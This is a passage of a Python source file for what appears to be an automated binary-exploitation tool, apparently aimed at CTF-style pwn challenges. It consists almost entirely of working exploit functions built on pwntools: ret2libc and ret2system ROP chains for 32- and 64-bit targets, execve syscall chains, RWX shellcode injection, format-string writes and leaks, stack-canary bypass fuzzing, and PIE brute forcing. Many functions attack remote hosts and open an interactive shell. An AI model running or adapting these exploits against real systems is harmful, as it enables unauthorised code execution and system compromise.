    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")
    
    # Stage 1: Leak write address
    print_payload("stage 1: leaking write address from GOT")
    payload1 = asm('nop') * padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    
    io.recv()
    io.sendline(payload1)
    
    write_addr = u32(io.recv(4))
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")
    
    # Calculate system and /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc.dump('write')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_write = libc.symbols['write']
        system_addr = write_addr - libc_write + libc.symbols['system']
        sh_addr = write_addr - libc_write + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    # Stage 2: Execute system("/bin/sh")
    print_payload("stage 2: executing system('/bin/sh')")
    payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    
    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_write_x64_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, url, port):
    """ret2libc exploitation using write function (x64 remote)"""
    print_section_header("EXPLOITATION: ret2libc (write) - x64 Remote")
    print_payload("preparing ret2libc exploit using write function")
    
    io = remote(url, port)
    
    if libc == 1:
        print_info("using LibcSearcher for libc resolution")
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    write_plt = e.symbols['write']
    write_got = e.got['write']
    
    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rsi_addr = int(pop_rsi_addr, 16)
    ret_addr = int(ret_addr, 16)
    
    # Stage 1: Leak write address
    print_payload("stage 1: leaking write address from GOT")
    if other_rsi_registers == 1:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(0),
            p64(write_plt),
            p64(main_addr)
        ])
    elif other_rdi_registers == 1:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(0),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(write_plt),
            p64(main_addr)
        ])
    elif other_rdi_registers == 0 and other_rsi_registers == 0:
        payload1 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(1),
            p64(pop_rsi_addr),
            p64(write_got),
            p64(write_plt),
            p64(main_addr)
        ])
    
    io.recv()
    io.sendline(payload1)
    
    write_addr = u64(io.recv(8))
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")
    
    # Calculate system and /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc.dump('write')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_write = libc.symbols['write']
        system_addr = write_addr - libc_write + libc.symbols['system']
        sh_addr = write_addr - libc_write + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    # Stage 2: Execute system("/bin/sh")
    print_payload("stage 2: executing system('/bin/sh')")
    io.recv()
    
    if other_rdi_registers == 1:
        payload2 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(sh_addr),
            p64(0),
            p64(ret_addr),
            p64(system_addr)
        ])
    else:
        payload2 = flat([
            asm('nop') * padding,
            p64(pop_rdi_addr),
            p64(sh_addr),
            p64(ret_addr),
            p64(system_addr)
        ])
    
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def system_fmtstr_remote(program, offset, buf_addr, url, port):
    """Format string exploitation (remote)"""
    print_section_header("EXPLOITATION: Format String - Remote")
    print_payload("preparing format string exploit")
    
    io = remote(url, port)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p64(buf_addr)
    system_addr = buf_addr
    offset_bytes = str(offset).encode()
    
    payload = system_addr + b'%' + offset_bytes + b'$n'
    print_payload(f"payload: {payload}")
    
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def fmtstr_print_strings(program):
    """Print strings using format string (local)"""
    print_section_header("FORMAT STRING LEAK - Local")
    print_info("leaking program strings using format string")
    elf = context.binary = ELF(program, checksec=False)
    
    for i in range(100):
        try:
            io = process(program, level='error')
            io.sendline('%{}$s'.format(i).encode())
            result = io.recv()
            if result and len(result.strip()) > 0:
                print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
            io.close()
        except EOFError:
            pass

def fmtstr_print_strings_remote(program, url, port):
    """Print strings using format string (remote)"""
    print_section_header("FORMAT STRING LEAK - Remote")
    print_info(f"leaking program strings from {url}:{port}")
    elf = context.binary = ELF(program, checksec=False)
    
    for i in range(100):
        try:
            io = remote(url, port)
            io.sendline('%{}$s'.format(i).encode())
            result = io.recv()
            if result and len(result.strip()) > 0:
                print_info(f"offset {i}: {Colors.YELLOW}{result}{Colors.END}")
            io.close()
        except EOFError:
            pass

def leakage_canary_value(program):
    """Leak canary values using format string"""
    print_info("leaking canary values")
    elf = context.binary = ELF(program, checksec=False)
    with open('canary.txt', 'w') as f:
        for i in range(100):
            try:
                with process(program) as p:
                    p.sendline(f'%{i}$p'.encode())
                    p.recvline()
                    result = p.recvline().decode().strip()
                    if result:
                        line = f"{result}\n"
                        f.write(line)
            except EOFError:
                pass

def canary_fuzz(program, bit):
    """Fuzz for canary bypass"""
    print_section_header("CANARY BYPASS FUZZING")
    print_info("fuzzing for canary bypass")
    
    if bit == 64:
        char = 'A'
        test = 'AAAAAAAA'
        with open('canary.txt', 'r') as f:
            lines = [line.strip() for line in f.readlines()[1:]]
        
        c = 1
        i = 1
        max_c = 300
        max_i = len(lines)
        
        print_info(f"testing {max_i} canary values with {max_c} parameters")
        
        while c < max_c and i < max_i:
            current_line = lines[i]
            found_j = False
            exit_current = False
            for j in range(i + 1, max_i):
                if lines[j].startswith('0x8'):
                    diff = j - i
                    padding = 0
                    found_j = True
                    
                    print_info(f"testing parameter c={c}, diff={diff}")
                    
                    while padding <= 300:
                        io = process(program)
                        io.recv()
                        io.sendline(f'%{c}$p'.encode())
                        result = io.recvline().decode().strip()
                        
                        if result.startswith('0x'):
                            result = int(result, 16)
                            result = p64(result)
                        
                        input_data = flat([char * (padding + 1), result, test * diff])
                        io.recv()
                        io.sendline(input_data)
                        io.wait()
                        
                        if io.poll() == -11:
                            padding = padding + 1
                            print_success(f"canary bypass found! c={c}, padding={padding}, diff={diff}")
                            return padding, c, diff
                        
                        io.close()
                        padding += 1
                    
                    if padding > 300:
                        print_warning(f"parameter c={c} test failed, trying next parameter")
                        c += 1
                        i += 1
                        exit_current = True
                        break
                    break
                
                if exit_current:
                    break
            
            if exit_current:
                continue
            
            if not found_j:
                i += 1
                if i >= max_i:
                    c += 1
                    i = 0
        
        print_critical("All parameters tested, no valid offset found")
        padding = None
        return padding, None, None
    
    # Similar logic for 32-bit
    if bit == 32:
        char = 'A'
        test = 'AAAA'
        with open('canary.txt', 'r') as f:
            lines = [line.strip() for line in f.readlines()[1:]]
        
        c = 1
        i = 1
        max_c = 300
        max_i = len(lines)
        
        while c < max_c and i < max_i:
            current_line = lines[i]
            found_j = False
            exit_current = False
            for j in range(i + 1, max_i):
                if lines[j].startswith('0x8'):
                    diff = j - i
                    padding = 0
                    found_j = True
                    
                    while padding <= 300:
                        io = process(program)
                        io.recv()
                        io.sendline(f'%{c}$p'.encode())
                        result = io.recvline().decode().strip()
                        print_info(f"Debug: c={c}, i={i}, padding={padding}, result={result}, diff={diff}")
                        
                        if result.startswith('0x'):
                            result = int(result, 16)
                            result = p32(result)
                        
                        input_data = flat([char * (padding + 1), result, test * diff])
                        io.recv()
                        io.sendline(input_data)
                        io.wait()
                        
                        if io.poll() == -11:
                            padding = padding + 1
                            print_success(f"canary bypass found! c={c}, padding={padding}, diff={diff}")
                            return padding, c, diff
                        
                        io.close()
                        padding += 1
                    
                    if padding > 300:
                        print_warning(f"c={c} test failed, trying next parameter")
                        c += 1
                        i += 1
                        exit_current = True
                        break
                    break
                
                if exit_current:
                    break
            
            if exit_current:
                continue
            
            if not found_j:
                i += 1
                if i >= max_i:
                    c += 1
                    i = 0
        
        print_critical("All parameters tested, no valid offset found")
        padding = None
        return padding, None, None

def pie_backdoor_exploit(program, padding, backdoor, libc_path, libc, callsystem):
    """PIE backdoor exploitation (local)"""
    print_section_header("EXPLOITATION: PIE Backdoor - Local")
    print_payload("preparing PIE backdoor brute force")
    
    elf = ELF(program)
    if backdoor == 1:
        backdoor = elf.symbols["backdoor"] + 0x04
    if callsystem == 1:
        backdoor = elf.symbols["callsystem"] + 0x04
    backdoor_bytes = p64(backdoor)
    valid_bytes = backdoor_bytes.replace(b'\x00', b'')
    valid_byte_length = len(valid_bytes)

    cleaned_bytes = backdoor_bytes[:valid_byte_length]
    payload = asm("nop") * padding + cleaned_bytes

    count = 1
    print_info("starting PIE brute force attack")
    while True:
        io = process(program)
        try:
            count += 1
            print_info(f"attempt {Colors.YELLOW}{count}{Colors.END}", prefix="[BRUTE]")
            io.recv()
            io.send(payload)
            recv = io.recv(timeout=10)
        except:
            print_warning(f"attempt {count} failed", prefix="[BRUTE]")
        else:
            print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
            io.interactive()
            break

def pie_backdoor_exploit_remote(program, padding, backdoor, libc_path, libc, url, port, callsystem):
    """PIE backdoor exploitation (remote)"""
    print_section_header("EXPLOITATION: PIE Backdoor - Remote")
    print_payload("preparing PIE backdoor brute force")
    
    elf = ELF(program)
    if backdoor == 1:
        backdoor = elf.symbols["backdoor"] + 0x04
    if callsystem == 1:
        backdoor = elf.symbols["callsystem"] + 0x04
    
    backdoor_bytes = p64(backdoor)
    valid_bytes = backdoor_bytes.replace(b'\x00', b'')
    valid_byte_length = len(valid_bytes)
    
    cleaned_bytes = backdoor_bytes[:valid_byte_length]
    payload = asm("nop") * padding + cleaned_bytes
    
    count = 1
    print_info(f"starting PIE brute force attack against {Colors.YELLOW}{url}:{port}{Colors.END}")
    while True:
        io = remote(url, port)
        try:
            count += 1
            print_info(f"attempt {Colors.YELLOW}{count}{Colors.END}", prefix="[BRUTE]")
            io.recv()
            io.send(payload)
            recv = io.recv(timeout=10)
        except:
            print_warning(f"attempt {count} failed", prefix="[BRUTE]")
        else:
            print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
            io.interactive()
            break

# Exploitation functions with improved output
def ret2libc_write_x32(program, libc, padding, libc_path):
    """ret2libc exploitation using write function (x32)"""
    print_section_header("EXPLOITATION: ret2libc (write) - x32")
    print_payload("preparing ret2libc exploit using write function")
    
    io = process(program)
    
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher for libc resolution")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    write_plt = e.symbols['write']
    write_got = e.got['write']
    
    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"write@plt: {Colors.YELLOW}{hex(write_plt)}{Colors.END}")
    print_info(f"write@got: {Colors.YELLOW}{hex(write_got)}{Colors.END}")
    
    # Stage 1: Leak write address
    print_payload("stage 1: leaking write address from GOT")
    payload1 = asm('nop') * padding + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    
    io.recv()
    io.sendline(payload1)
    
    write_addr = u32(io.recv(4))
    print_success(f"write address leaked: {Colors.YELLOW}{hex(write_addr)}{Colors.END}")
    
    # Calculate system and /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("write", write_addr)
        libcbase = write_addr - libc.dump('write')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_write = libc.symbols['write']
        system_addr = write_addr - libc_write + libc.symbols['system']
        sh_addr = write_addr - libc_write + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    # Stage 2: Execute system("/bin/sh")
    print_payload("stage 2: executing system('/bin/sh')")
    payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    
    io.recv()
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2_system_x32(program, libc, padding, libc_path):
    """ret2system exploitation (x32)"""
    print_section_header("EXPLOITATION: ret2system - x32")
    print_payload("preparing ret2system exploit")
    
    io = process(program)
    e = ELF(program)
    system_addr = e.symbols['system']
    bin_sh_addr = next(e.search(b'/bin/sh'))
    
    print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
    
    payload = asm('nop') * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2_system_x64(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, libc_path):
    """ret2system exploitation (x64)"""
    print_section_header("EXPLOITATION: ret2system - x64")
    print_payload("preparing ret2system exploit")
    
    if pop_rdi_addr == None:
        print_error("pop rdi gadget not found, exploitation not possible")
        sys.exit(0)
    
    io = process(program)
    e = ELF(program)
    system_addr = e.symbols['system']
    bin_sh_addr = next(e.search(b'/bin/sh'))
    
    print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rdi_addr = p64(pop_rdi_addr)
    ret_addr = int(ret_addr, 16)
    ret_addr = p64(ret_addr)
    
    if other_rdi_registers == 1:
        payload = flat([asm('nop') * padding, pop_rdi_addr, p64(bin_sh_addr), p64(0), ret_addr, p64(system_addr), p64(0)])
    elif other_rdi_registers == 0:
        payload = flat([asm('nop') * padding, pop_rdi_addr, p64(bin_sh_addr), ret_addr, p64(system_addr)])
    
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2_system_x32_remote(program, libc, padding, url, port):
    """ret2system exploitation (x32 remote)"""
    print_section_header("EXPLOITATION: ret2system - x32 Remote")
    print_payload("preparing ret2system exploit")
    
    io = remote(url, port)
    e = ELF(program)
    system_addr = e.symbols['system']
    bin_sh_addr = next(e.search(b'/bin/sh'))
    
    print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
    
    payload = asm('nop') * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2_system_x64_remote(program, libc, padding, pop_rdi_addr, other_rdi_registers, ret_addr, url, port):
    """ret2system exploitation (x64 remote)"""
    print_section_header("EXPLOITATION: ret2system - x64 Remote")
    print_payload("preparing ret2system exploit")
    
    if pop_rdi_addr == None:
        print_error("pop rdi gadget not found, exploitation not possible")
        sys.exit(0)
    
    io = remote(url, port)
    e = ELF(program)
    system_addr = e.symbols['system']
    bin_sh_addr = next(e.search(b'/bin/sh'))
    
    print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rdi_addr = p64(pop_rdi_addr)
    ret_addr = int(ret_addr, 16)
    ret_addr = p64(ret_addr)
    
    if other_rdi_registers == 1:
        payload = flat([asm('nop') * padding, pop_rdi_addr, p64(bin_sh_addr), p64(0), ret_addr, p64(system_addr), p64(0)])
    elif other_rdi_registers == 0:
        payload = flat([asm('nop') * padding, pop_rdi_addr, p64(bin_sh_addr), ret_addr, p64(system_addr)])
    
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_put_x32(program, libc, padding, libc_path):
    """ret2libc exploitation using puts function (x32)"""
    print_section_header("EXPLOITATION: ret2libc (puts) - x32")
    print_payload("preparing ret2libc exploit using puts function")
    
    io = process(program)
    if libc == 1:
        if libc_path == None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    puts_plt = e.symbols['puts']
    puts_got = e.got['puts']
    
    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"puts@plt: {Colors.YELLOW}{hex(puts_plt)}{Colors.END}")
    print_info(f"puts@got: {Colors.YELLOW}{hex(puts_got)}{Colors.END}")
    
    payload1 = asm('nop') * padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)
    io.recv()
    io.sendline(payload1)
    
    puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")
    
    if libc == 1:
        libc = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc.dump('puts')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_puts = libc.symbols['puts']
        system_addr = puts_addr - libc_puts + libc.symbols['system']
        sh_addr = puts_addr - libc_puts + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_put_x64(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, libc_path):
    """ret2libc exploitation using puts function (x64)"""
    print_section_header("EXPLOITATION: ret2libc (puts) - x64")
    print_payload("preparing ret2libc exploit using puts function")
    
    io = process(program)
    if libc == 1:
        if libc_path is None:
            print_info("using LibcSearcher")
        else:
            print_info(f"using detected libc: {libc_path}")
            libc = ELF(libc_path)
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    puts_plt = e.symbols['puts']
    puts_got = e.got['puts']
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rdi_addr = p64(pop_rdi_addr)
    
    # First payload: leak puts address from GOT
    payload1 = flat([
        asm('nop') * padding,
        pop_rdi_addr,
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ])
    io.recv()
    io.sendline(payload1)
    
    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")
    
    # Calculate libc base and system, /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc.dump('puts')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_puts = libc.symbols['puts']
        system_addr = puts_addr - libc_puts + libc.symbols['system']
        sh_addr = puts_addr - libc_puts + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    io.recv()
    ret_addr = p64(int(ret_addr, 16))
    
    # Second payload: call system("/bin/sh")
    if other_rdi_registers == 1:
        payload2 = flat([
            asm('nop') * padding,
            pop_rdi_addr,
            p64(sh_addr),
            p64(0),
            ret_addr,
            p64(system_addr),
            p64(0)
        ])
    else:
        payload2 = flat([
            asm('nop') * padding,
            pop_rdi_addr,
            p64(sh_addr),
            ret_addr,
            p64(system_addr)
        ])
    
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def execve_syscall(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80):
    """execve syscall exploitation (x32)"""
    print_section_header("EXPLOITATION: execve syscall - x32")
    print_payload("preparing execve syscall exploit")
    
    if pop_ecx_addr == None:
        io = process(program)
        e = ELF(program)
        bin_sh_addr = next(e.search(b'/bin/sh'))
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
        
        pop_eax_addr = int(pop_eax_addr, 16)
        pop_eax_addr = p32(pop_eax_addr)
        pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
        pop_ecx_ebx_addr = p32(pop_ecx_ebx_addr)
        pop_edx_addr = int(pop_edx_addr, 16)
        pop_edx_addr = p32(pop_edx_addr)
        int_0x80 = int(int_0x80, 16)
        int_0x80 = p32(int_0x80)
        
        payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ecx_ebx_addr, 0, bin_sh_addr, pop_edx_addr, 0, int_0x80])
        io.recv()
        io.sendline(payload)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        io.interactive()
    else:
        io = process(program)
        e = ELF(program)
        bin_sh_addr = next(e.search(b'/bin/sh'))
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
        
        pop_eax_addr = int(pop_eax_addr, 16)
        pop_eax_addr = p32(pop_eax_addr)
        pop_ecx_addr = int(pop_ecx_addr, 16)
        pop_ecx_addr = p32(pop_ecx_addr)
        pop_ebx_addr = int(pop_ebx_addr, 16)
        pop_ebx_addr = p32(pop_ebx_addr)
        pop_edx_addr = int(pop_edx_addr, 16)
        pop_edx_addr = p32(pop_edx_addr)
        int_0x80 = int(int_0x80, 16)
        int_0x80 = p32(int_0x80)
        
        payload = flat([asm('nop') * padding, pop_eax_addr, 0xb, pop_ebx_addr, bin_sh_addr, pop_ecx_addr, 0, pop_edx_addr, 0, int_0x80])
        io.recv()
        io.sendline(payload)
        print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
        io.interactive()

def rwx_shellcode_x32(program, buf_addr, padding, function_name, ret_addr):
    """RWX shellcode exploitation (x32)"""
    print_section_header("EXPLOITATION: RWX Shellcode - x32")
    print_payload("preparing RWX shellcode exploit")
    
    io = process(program)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p32(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())
    
    print_info(f"shellcode storage: {Colors.YELLOW}{function_name}{Colors.END}")
    print_info(f"shellcode size: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes")
    
    payload = flat([shellcode.ljust(padding, asm('nop')), p32(name_addr)])
    io.recv()
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def rwx_shellcode_x64(program, buf_addr, padding, function_name, ret_addr, libc_path):
    """RWX shellcode exploitation (x64)"""
    print_section_header("EXPLOITATION: RWX Shellcode - x64")
    print_payload("preparing RWX shellcode exploit")
    
    io = process(program)
    elf = ELF(program)
    buf_addr = int(buf_addr, 16)
    buf_addr = p64(buf_addr)
    name_addr = elf.symbols[function_name]
    shellcode = asm(shellcraft.sh())
    
    print_info(f"shellcode storage: {Colors.YELLOW}{function_name}{Colors.END}")
    print_info(f"shellcode size: {Colors.YELLOW}{len(shellcode)}{Colors.END} bytes")
    
    payload = flat([shellcode.ljust(padding, asm('nop')), p64(name_addr)])
    io.recv()
    io.sendline(payload)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_put_x32_remote(program, libc, padding, url, port):
    """Remote ret2libc exploitation using puts for x32 architecture"""
    print_section_header("EXPLOITATION: ret2libc (puts) - x32 Remote")
    print_payload("preparing remote ret2libc exploit using puts function")
    
    io = remote(url, port)
    
    if libc == 1:
        print_info("using LibcSearcher for libc resolution")
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    puts_plt = e.symbols['puts']
    puts_got = e.got['puts']
    
    print_info(f"main address: {Colors.YELLOW}{hex(main_addr)}{Colors.END}")
    print_info(f"puts@plt: {Colors.YELLOW}{hex(puts_plt)}{Colors.END}")
    print_info(f"puts@got: {Colors.YELLOW}{hex(puts_got)}{Colors.END}")
    
    # First payload: leak puts address
    payload1 = asm('nop') * padding + p32(puts_plt) + p32(main_addr) + p32(puts_got)
    
    print_payload("sending puts leak payload")
    io.recv()
    io.sendline(payload1)
    
    # Receive leaked puts address
    puts_addr = u32(io.recvuntil(b'\xf7')[-4:])
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")
    
    if libc == 1:
        libc = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc.dump('puts')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_puts = libc.symbols['puts']
        system_addr = puts_addr - libc_puts + libc.symbols['system']
        sh_addr = puts_addr - libc_puts + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    # Second payload: execute system("/bin/sh")
    payload2 = asm('nop') * padding + p32(system_addr) + p32(0) + p32(sh_addr)
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def ret2libc_put_x64_remote(program, libc, padding, pop_rdi_addr, pop_rsi_addr, ret_addr, other_rdi_registers, other_rsi_registers, url, port):
    """Remote ret2libc exploitation using puts for x64 architecture"""
    print_section_header("EXPLOITATION: ret2libc (puts) - x64 Remote")
    print_payload("preparing remote ret2libc exploit using puts function")
    
    io = remote(url, port)
    if libc == 1:
        print_info("using LibcSearcher for libc resolution")
    else:
        libc = ELF(libc)
    
    e = ELF(program)
    main_addr = e.symbols['main']
    puts_plt = e.symbols['puts']
    puts_got = e.got['puts']
    
    pop_rdi_addr = int(pop_rdi_addr, 16)
    pop_rdi_addr = p64(pop_rdi_addr)
    
    # First payload: leak puts address from GOT
    payload1 = flat([
        asm('nop') * padding,
        pop_rdi_addr,
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ])
    
    print_payload("sending puts leak payload")
    io.recv()
    io.sendline(payload1)
    
    # Receive leaked puts address
    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    print_success(f"puts address leaked: {Colors.YELLOW}{hex(puts_addr)}{Colors.END}")
    
    # Calculate libc base and system, /bin/sh addresses
    if libc == 1:
        libc = LibcSearcher("puts", puts_addr)
        libcbase = puts_addr - libc.dump('puts')
        system_addr = libcbase + libc.dump('system')
        sh_addr = libcbase + libc.dump('str_bin_sh')
    else:
        libc_puts = libc.symbols['puts']
        system_addr = puts_addr - libc_puts + libc.symbols['system']
        sh_addr = puts_addr - libc_puts + next(libc.search(b'/bin/sh'))
    
    print_success(f"system address calculated: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
    print_success(f"/bin/sh address calculated: {Colors.YELLOW}{hex(sh_addr)}{Colors.END}")
    
    io.recv()
    ret_addr = p64(int(ret_addr, 16))
    
    # Second payload: call system("/bin/sh")
    if other_rdi_registers == 1:
        payload2 = flat([
            asm('nop') * padding,
            pop_rdi_addr,
            p64(sh_addr),
            p64(0),
            ret_addr,
            p64(system_addr),
            p64(0)
        ])
    else:
        payload2 = flat([
            asm('nop') * padding,
            pop_rdi_addr,
            p64(sh_addr),
            ret_addr,
            p64(system_addr)
        ])
    
    io.sendline(payload2)
    print_critical("EXPLOITATION SUCCESSFUL! Dropping to shell...")
    io.interactive()

def execve_syscall_remote(program, padding, pop_eax_addr, pop_ebx_addr, pop_ecx_addr, pop_edx_addr, pop_ecx_ebx_addr, ret_addr, int_0x80, url, port):
    """Remote execve syscall exploitation for x32 architecture"""
    print_section_header("EXPLOITATION: execve syscall - x32 Remote")
    print_payload("preparing remote execve syscall exploit")
    
    io = remote(url, port)
    
    if pop_ecx_addr == None:
        e = ELF(program)
        bin_sh_addr = next(e.search(b'/bin/sh'))
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")
        
        pop_eax_addr = int(pop_eax_addr, 16)
        pop_eax_addr = p32(pop_eax_addr)
        pop_ecx_ebx_addr = int(pop_ecx_ebx_addr, 16)
